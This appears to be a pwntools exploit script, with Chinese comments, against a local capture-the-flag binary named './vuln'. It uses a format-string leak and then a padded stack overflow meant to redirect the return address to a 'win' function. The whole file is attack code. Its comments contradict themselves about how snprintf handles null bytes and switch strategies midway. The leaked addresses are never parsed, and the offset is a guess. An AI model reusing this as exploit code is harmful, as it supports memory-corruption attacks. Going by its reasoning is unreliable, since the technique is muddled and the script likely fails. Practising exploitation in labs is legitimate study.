from pwn import *

context.binary = './vuln'
elf = ELF('./vuln')

# 构造payload
# 首先泄露栈地址
# 使用%p泄露栈上的返回地址位置
# 然后利用整数溢出使snprintf写入大量数据，覆盖返回地址为shellcode或ROP

# 假设程序在x86-64，栈上偏移
# 先发送格式化字符串泄露
p = process(['./vuln', '%p.'*20])
p.recvline()
# 解析泄露的地址
# 然后构造第二次利用
# 由于整数溢出，我们可以传入一个很大的size，但snprintf会写入直到遇到null？
# 实际上snprintf会限制写入size-1字节，但size极大，所以几乎无限
# 我们可以利用%n写任意值

# 更精确的利用：
# 假设我们想要覆盖返回地址为0x4141414141414141
# 使用%n需要先控制栈上的指针
# 我们可以通过格式化字符串将某个栈地址写入，然后使用%n
# 但这里简化：直接利用整数溢出导致栈溢出，覆盖返回地址

# 构造payload：填充到返回地址，然后覆盖为win函数地址
payload = b'%p' * 10  # 先泄露
payload += b'A' * (0x100 - len(payload))  # 填充到返回地址
payload += p64(elf.symbols['win'])  # 覆盖返回地址

# 但需要确保snprintf不会在遇到null时停止？snprintf会写入直到格式字符串结束，但遇到null会停止？
# 实际上snprintf会处理格式字符串，但不会在中间停止，除非遇到null终止符
# 所以payload中不能有null字节，但地址通常有null，需要特殊处理
# 这里仅演示概念

p.sendline(payload)
p.interactive()


